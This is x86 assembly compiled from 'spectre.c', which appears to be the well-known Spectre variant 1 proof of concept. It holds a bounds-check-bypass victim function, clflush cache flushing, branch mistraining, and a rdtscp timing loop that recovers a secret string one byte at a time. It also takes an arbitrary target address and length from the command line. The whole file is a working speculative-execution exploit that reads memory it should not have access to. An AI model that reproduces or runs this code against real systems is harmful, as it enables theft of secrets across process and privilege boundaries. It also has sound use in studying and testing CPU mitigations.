	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR array1_size@GOTOFF[eax]
	cmp	eax, DWORD PTR 4[esp]
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5563:
	.cfi_startproc
	push	edi
	.cfi_def_cfa_offset 8
	.cfi_offset 7, -8
	push	esi
	.cfi_def_cfa_offset 12
	.cfi_offset 6, -12
	push	ebx
	.cfi_def_cfa_offset 16
	.cfi_offset 3, -16
	call	__x86.get_pc_thunk.di
	add	edi, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR 16[esp]
	mov	edx, DWORD PTR array1_size@GOTOFF[edi]
	cmp	edx, eax
	jbe	.L2
	sub	eax, 1
	js	.L2
	movzx	ecx, BYTE PTR temp@GOTOFF[edi]
	lea	eax, array1@GOTOFF[edi+eax]
	lea	esi, array2@GOTOFF[edi]
	lea	ebx, array1@GOTOFF[edi]
.L4:
	movzx	edx, BYTE PTR [eax]
	sal	edx, 9
	and	cl, BYTE PTR [edx+esi]
	sub	eax, 1
	cmp	eax, ebx
	jns	.L4
	mov	BYTE PTR temp@GOTOFF[edi], cl
.L2:
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 12
	pop	esi
	.cfi_restore 6
	.cfi_def_cfa_offset 8
	pop	edi
	.cfi_restore 7
	.cfi_def_cfa_offset 4
	ret
	.cfi_endproc
.LFE5563:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5564:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	push	edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	push	esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	push	ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	sub	esp, 60
	.cfi_def_cfa_offset 80
	call	__x86.get_pc_thunk.bp
	add	ebp, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR 44[esp], eax
	xor	eax, eax
	mov	DWORD PTR 36[esp], 0
	lea	eax, results@GOTOFF[ebp]
	lea	edx, 1024[eax]
.L8:
	mov	DWORD PTR [eax], 0
	add	eax, 4
	cmp	eax, edx
	jne	.L8
	mov	DWORD PTR 28[esp], 999
	lea	eax, array2@GOTOFF[ebp]
	mov	DWORD PTR 16[esp], eax
	jmp	.L9
.L11:
	mov	eax, ebx
	imul	edi
	mov	eax, ebx
	sar	eax, 31
	sub	edx, eax
	lea	edx, [edx+edx*2]
	add	edx, edx
	mov	eax, ebx
	sub	eax, edx
	sub	eax, 1
	mov	ecx, eax
	mov	cx, 0
	shr	eax, 16
	mov	edx, DWORD PTR 8[esp]
	xor	edx, DWORD PTR 80[esp]
	or	eax, ecx
	and	edx, eax
	xor	edx, DWORD PTR 8[esp]
	push	edx
	.cfi_def_cfa_offset 84
	call	victim_function
	sub	ebx, 1
	add	esp, 4
	.cfi_def_cfa_offset 80
	cmp	ebx, -1
	je	.L24
.L13:
	clflush	[esi]
	mov	DWORD PTR 40[esp], 0
	mov	eax, DWORD PTR 40[esp]
	cmp	eax, 99
	jg	.L11
.L12:
	mov	eax, DWORD PTR 40[esp]
	add	eax, 1
	mov	DWORD PTR 40[esp], eax
	mov	eax, DWORD PTR 40[esp]
	cmp	eax, 99
	jle	.L12
	jmp	.L11
.L24:
	mov	edi, 13
	lea	eax, results@GOTOFF[ebp]
	mov	DWORD PTR 24[esp], eax
	mov	ebx, edi
	jmp	.L15
.L26:
	mov	eax, DWORD PTR 24[esp]
	add	DWORD PTR [eax+esi*4], 1
.L14:
	add	ebx, 167
	cmp	ebx, 42765
	je	.L25
.L15:
	movzx	esi, bl
	mov	edi, esi
	sal	edi, 9
	rdtscp
	mov	DWORD PTR 8[esp], eax
	mov	DWORD PTR 12[esp], edx
	mov	DWORD PTR 36[esp], ecx
	mov	edx, DWORD PTR 16[esp]
	movzx	eax, BYTE PTR [edx+edi]
	rdtscp
	mov	DWORD PTR 36[esp], ecx
	sub	eax, DWORD PTR 8[esp]
	sbb	edx, DWORD PTR 12[esp]
	mov	ecx, edx
	mov	edx, eax
	mov	eax, 50
	cmp	eax, edx
	mov	eax, 0
	sbb	eax, ecx
	jc	.L14
	mov	ecx, DWORD PTR array1_size@GOTOFF[ebp]
	mov	eax, DWORD PTR 20[esp]
	cdq
	idiv	ecx
	movzx	eax, BYTE PTR array1@GOTOFF[ebp+edx]
	cmp	eax, esi
	jne	.L26
	jmp	.L14
.L25:
	sub	DWORD PTR 28[esp], 1
	je	.L16
.L9:
	mov	eax, DWORD PTR 28[esp]
	mov	DWORD PTR 20[esp], eax
	lea	eax, array2@GOTOFF[ebp]
	lea	edx, 131072[eax]
.L10:
	clflush	[eax]
	add	eax, 512
	cmp	edx, eax
	jne	.L10
	mov	esi, DWORD PTR array1_size@GOTOFF[ebp]
	mov	eax, DWORD PTR 20[esp]
	cdq
	idiv	esi
	mov	DWORD PTR 8[esp], edx
	mov	ebx, 29
	lea	esi, array1_size@GOTOFF[ebp]
	mov	edi, 715827883
	jmp	.L13
.L16:
	mov	eax, DWORD PTR results@GOTOFF[ebp]
	xor	eax, DWORD PTR 36[esp]
	mov	DWORD PTR results@GOTOFF[ebp], eax
	mov	eax, DWORD PTR 44[esp]
	sub	eax, DWORD PTR gs:20
	jne	.L27
	add	esp, 60
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	pop	esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	pop	edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
.L27:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5564:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC0:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"%p"
.LC2:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC3:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC4:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.section	.rodata.str1.1
.LC6:
	.string	"result[%d]=%d "
.LC7:
	.string	"\n"
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5565:
	.cfi_startproc
	lea	ecx, 4[esp]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR -4[ecx]
	push	ebp
	mov	ebp, esp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	push	edi
	push	esi
	push	ebx
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	sub	esp, 72
	call	__x86.get_pc_thunk.dx
	add	edx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	DWORD PTR -68[ebp], edx
	mov	eax, ecx
	mov	ecx, DWORD PTR [ecx]
	mov	DWORD PTR -84[ebp], ecx
	mov	eax, DWORD PTR 4[eax]
	mov	DWORD PTR -88[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	xor	eax, eax
	mov	eax, DWORD PTR stdin@GOT[edx]
	mov	DWORD PTR -76[ebp], eax
	lea	eax, check@GOTOFF[edx]
	mov	DWORD PTR -80[ebp], eax
.L29:
	sub	esp, 12
	mov	eax, DWORD PTR -76[ebp]
	push	DWORD PTR [eax]
	mov	ebx, DWORD PTR -68[ebp]
	call	getc@PLT
	add	esp, 16
	cmp	al, 114
	je	.L44
	cmp	al, 10
	je	.L29
	cmp	al, 105
	jne	.L38
	mov	ebx, DWORD PTR -68[ebp]
	call	getpid@PLT
	sub	esp, 12
	push	eax
	mov	eax, DWORD PTR -80[ebp]
	cdq
	add	eax, 33
	adc	edx, 0
	push	edx
	push	eax
	lea	eax, .LC8@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L29
.L44:
	mov	edi, DWORD PTR -68[ebp]
	mov	eax, DWORD PTR secret@GOTOFF[edi]
	push	eax
	push	eax
	lea	eax, .LC0@GOTOFF[edi]
	push	eax
	push	1
	mov	ebx, edi
	call	__printf_chk@PLT
	mov	eax, DWORD PTR secret@GOTOFF[edi]
	lea	ecx, array1@GOTOFF[edi]
	mov	edx, eax
	sub	edx, ecx
	mov	DWORD PTR -48[ebp], edx
	mov	DWORD PTR [esp], eax
	call	strlen@PLT
	add	esp, 16
	mov	DWORD PTR -44[ebp], eax
	lea	eax, array2@GOTOFF[edi]
	lea	edx, 131072[eax]
.L31:
	mov	BYTE PTR [eax], 1
	add	eax, 1
	cmp	eax, edx
	jne	.L31
	cmp	DWORD PTR -84[ebp], 3
	je	.L45
.L32:
	sub	esp, 4
	push	DWORD PTR -44[ebp]
	mov	ebx, DWORD PTR -68[ebp]
	lea	eax, .LC4@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	add	esp, 16
	test	eax, eax
	js	.L29
	mov	DWORD PTR -72[ebp], 0
	lea	eax, .LC6@GOTOFF[ebx]
	mov	DWORD PTR -64[ebp], eax
	jmp	.L36
.L45:
	sub	esp, 4
	lea	eax, -48[ebp]
	push	eax
	mov	ebx, DWORD PTR -68[ebp]
	lea	eax, .LC1@GOTOFF[ebx]
	push	eax
	mov	edi, DWORD PTR -88[ebp]
	push	DWORD PTR 4[edi]
	call	__isoc99_sscanf@PLT
	lea	eax, array1@GOTOFF[ebx]
	sub	DWORD PTR -48[ebp], eax
	add	esp, 12
	lea	eax, -44[ebp]
	push	eax
	lea	eax, .LC2@GOTOFF[ebx]
	push	eax
	push	DWORD PTR 8[edi]
	call	__isoc99_sscanf@PLT
	push	DWORD PTR -44[ebp]
	push	DWORD PTR -48[ebp]
	lea	eax, .LC3@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L32
.L47:
	push	eax
	push	ecx
	push	DWORD PTR -64[ebp]
	push	1
	mov	ebx, DWORD PTR -68[ebp]
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -60[ebp]
	push	DWORD PTR [eax]
	push	edi
	push	DWORD PTR -64[ebp]
	push	1
	call	__printf_chk@PLT
	add	esp, 32
.L34:
	add	edi, 1
	add	esi, 4
	cmp	edi, 256
	je	.L46
.L35:
	lea	ecx, -1[edi]
	mov	DWORD PTR -60[ebp], esi
	mov	eax, DWORD PTR -4[esi]
	mov	edx, DWORD PTR [esi]
	cmp	eax, edx
	jle	.L34
	mov	ebx, eax
	sub	ebx, edx
	cmp	ebx, 100
	jle	.L34
	jmp	.L47
.L46:
	sub	esp, 8
	mov	ebx, DWORD PTR -68[ebp]
	lea	eax, .LC7@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	add	esp, 16
	test	eax, eax
	js	.L29
.L36:
	mov	ebx, DWORD PTR -68[ebp]
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	mov	edi, DWORD PTR -72[ebp]
	movsx	eax, BYTE PTR [eax+edi]
	sub	esp, 12
	push	eax
	push	eax
	push	DWORD PTR -48[ebp]
	lea	eax, .LC5@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	edi, 1
	mov	DWORD PTR -72[ebp], edi
	mov	eax, DWORD PTR -48[ebp]
	lea	edx, 1[eax]
	mov	DWORD PTR -48[ebp], edx
	add	esp, 28
	lea	edx, -40[ebp]
	push	edx
	lea	edx, -30[ebp]
	push	edx
	push	eax
	call	readMemoryByte
	lea	esi, results@GOTOFF[ebx+4]
	add	esp, 16
	mov	edi, 1
	jmp	.L35
.L38:
	mov	eax, DWORD PTR -28[ebp]
	sub	eax, DWORD PTR gs:20
	jne	.L48
	mov	eax, 0
	lea	esp, -16[ebp]
	pop	ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	edi
	.cfi_restore 7
	pop	ebp
	.cfi_restore 5
	lea	esp, -4[ecx]
	.cfi_def_cfa 4, 4
	ret
.L48:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	main, .-main
	.local	results
	.comm	results,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC9:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC9
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5566:
	.cfi_startproc
	mov	eax, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5566:
	.section	.text.__x86.get_pc_thunk.dx,"axG",@progbits,__x86.get_pc_thunk.dx,comdat
	.globl	__x86.get_pc_thunk.dx
	.hidden	__x86.get_pc_thunk.dx
	.type	__x86.get_pc_thunk.dx, @function
__x86.get_pc_thunk.dx:
.LFB5567:
	.cfi_startproc
	mov	edx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.di,"axG",@progbits,__x86.get_pc_thunk.di,comdat
	.globl	__x86.get_pc_thunk.di
	.hidden	__x86.get_pc_thunk.di
	.type	__x86.get_pc_thunk.di, @function
__x86.get_pc_thunk.di:
.LFB5568:
	.cfi_startproc
	mov	edi, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5568:
	.section	.text.__x86.get_pc_thunk.bp,"axG",@progbits,__x86.get_pc_thunk.bp,comdat
	.globl	__x86.get_pc_thunk.bp
	.hidden	__x86.get_pc_thunk.bp
	.type	__x86.get_pc_thunk.bp, @function
__x86.get_pc_thunk.bp:
.LFB5569:
	.cfi_startproc
	mov	ebp, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5569:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
